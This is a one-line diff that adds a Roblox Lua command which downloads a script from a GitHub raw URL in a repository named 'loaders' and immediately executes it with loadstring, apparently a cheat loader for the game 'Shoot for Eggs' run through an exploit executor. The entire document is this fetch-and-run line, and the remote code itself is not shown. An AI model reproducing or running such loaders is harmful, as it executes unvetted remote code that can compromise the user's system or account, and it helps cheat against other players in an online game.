@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unitetrumake/loaders/main/loaders/shoot-for-eggs-spam3-3mdtlgmghi09d1.lua"))()
